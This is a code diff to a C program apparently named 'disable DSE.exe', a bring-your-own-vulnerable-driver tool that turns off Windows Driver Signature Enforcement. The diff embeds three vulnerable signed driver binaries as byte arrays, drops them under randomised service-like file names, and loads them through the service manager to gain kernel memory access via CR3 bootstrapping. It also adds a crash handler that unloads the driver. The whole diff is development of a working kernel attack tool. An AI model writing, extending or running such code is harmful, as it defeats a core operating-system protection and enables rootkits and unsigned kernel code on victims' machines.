@@ -25,9 +25,9 @@
  * ThrottleStop binary:    place ThrottleStop.sys next to exe (distribute separately).
  * gdrv.sys is embedded as before.
  *
- * NOTE: LnvMSRIO.sys and ThrottleStop.sys cannot be embedded in the header at this
- * time — distribute as separate files alongside disable DSE.exe. The code will look
- * for them in the same directory as the exe.
+ * All three driver binaries (gdrv, LnvMSRIO, ThrottleStop) are embedded as
+ * byte-array headers at compile time — exe is fully self-contained, no companion
+ * files required.
  */
 
 #define WIN32_LEAN_AND_MEAN
@@ -40,10 +40,11 @@
 #include <string.h>
 #include <stdint.h>
 
-/* ── Embedded gdrv.sys ────────────────────────────────────────────────────── */
+/* ── Embedded drivers ─────────────────────────────────────────────────────── */
 #include "gdrv64_bytes.h"
-/* gdrv64_bytes.h defines GDRV64_SYS_DATA[] directly */
 #define GDRV64_SYS_SIZE  ((DWORD)sizeof(GDRV64_SYS_DATA))
+#include "lnv_bytes.h"
+#include "ts_bytes.h"
 
 /* ══════════════════════════════════════════════════════════════════════════
  * BACKEND DEFINITIONS
@@ -784,17 +785,21 @@ static BOOL drop_driver(const BYTE *data, DWORD sz, const char *suffix) {
     return ok&&(wr==sz);
 }
 
-/* drop companion driver (LnvMSRIO.sys / ThrottleStop.sys) from exe dir */
-static BOOL drop_companion(const char *filename) {
+/* drop companion driver from embedded byte array — no external files needed */
+static BOOL drop_embedded_sys(const BYTE *data, DWORD sz, const char *suffix) {
     char myDir[MAX_PATH];
     GetModuleFileNameA(NULL,myDir,sizeof(myDir));
     char *sl=strrchr(myDir,'\\'); if(sl) sl[1]='\0'; else GetTempPathA(sizeof(myDir),myDir);
-    char src[MAX_PATH]; snprintf(src,MAX_PATH,"%s%s",myDir,filename);
-    /* copy to randomised name in same dir */
-    snprintf(g_drvPath,MAX_PATH,"%shwsvc_%04X_%s",myDir,GetCurrentProcessId()&0xFFFF,filename);
-    if(!CopyFileA(src,g_drvPath,FALSE)) {
-        logf("[!] drop_companion: CopyFileA('%s' -> '%s') err=%lu",src,g_drvPath,GetLastError());
+    snprintf(g_drvPath,MAX_PATH,"%shwsvc_%04X%s.sys",myDir,GetCurrentProcessId()&0xFFFF,suffix);
+    HANDLE h=CreateFileA(g_drvPath,GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
+    if(h==INVALID_HANDLE_VALUE){
+        logf("[!] drop_embedded_sys: CreateFile('%s') err=%lu",g_drvPath,GetLastError());
         return FALSE;
+    }
+    DWORD wr=0; BOOL ok=WriteFile(h,data,sz,&wr,NULL); CloseHandle(h);
+    if(!ok||wr!=sz){
+        logf("[!] drop_embedded_sys: WriteFile err=%lu (wrote %lu/%lu)",GetLastError(),wr,sz);
+        DeleteFileA(g_drvPath); return FALSE;
     }
     return TRUE;
 }
@@ -922,7 +927,7 @@ static DWORD try_backend(Backend be, UINT64 ntoskrnl_kva) {
         if(!drop_driver(GDRV64_SYS_DATA,GDRV64_SYS_SIZE,"_gio")) return 1;
         le=scm_start(g_randSvc);
     } else if(be==BE_LNV) {
-        if(!drop_companion("LnvMSRIO.sys")) return 1;
+        if(!drop_embedded_sys(LNV_SYS_DATA,LNV_SYS_SIZE,"_lnv")) return 1;
         le=scm_start(g_randSvc);
         if(le==0) {
             if(!bootstrap_cr3(ntoskrnl_kva)){
@@ -931,7 +936,7 @@ static DWORD try_backend(Backend be, UINT64 ntoskrnl_kva) {
             }
         }
     } else { /* BE_TS */
-        if(!drop_companion("ThrottleStop.sys")) return 1;
+        if(!drop_embedded_sys(TS_SYS_DATA,TS_SYS_SIZE,"_ts")) return 1;
         le=scm_start(g_randSvc);
         if(le==0) {
             if(!bootstrap_cr3(ntoskrnl_kva)){
@@ -1390,13 +1395,26 @@ static BOOL read_yes(void){
 
 static BOOL WINAPI CtrlHandler(DWORD t){(void)t;scm_unload_current();return FALSE;}
 
+static int real_main_inner(int argc,char **argv);
 static int real_main(int argc,char **argv);
 int main(int argc,char **argv){
     SetConsoleCtrlHandler(CtrlHandler,TRUE);
     return real_main(argc,argv);
 }
 
+static LONG WINAPI TopLevelExHandler(EXCEPTION_POINTERS *ep){
+    DWORD code=ep->ExceptionRecord->ExceptionCode;
+    logf("[!] FATAL exception 0x%08lX — unloading BYOVD driver before crash",(unsigned long)code);
+    scm_unload_current();
+    return EXCEPTION_CONTINUE_SEARCH;
+}
+
 static int real_main(int argc,char **argv){
+    SetUnhandledExceptionFilter(TopLevelExHandler);
+    return real_main_inner(argc,argv);
+}
+
+static int real_main_inner(int argc,char **argv){
     RunMode mode=MODE_INTERACTIVE;
     if(argc>=2){
         if(_stricmp(argv[1],"-off")==0) mode=MODE_OFF;
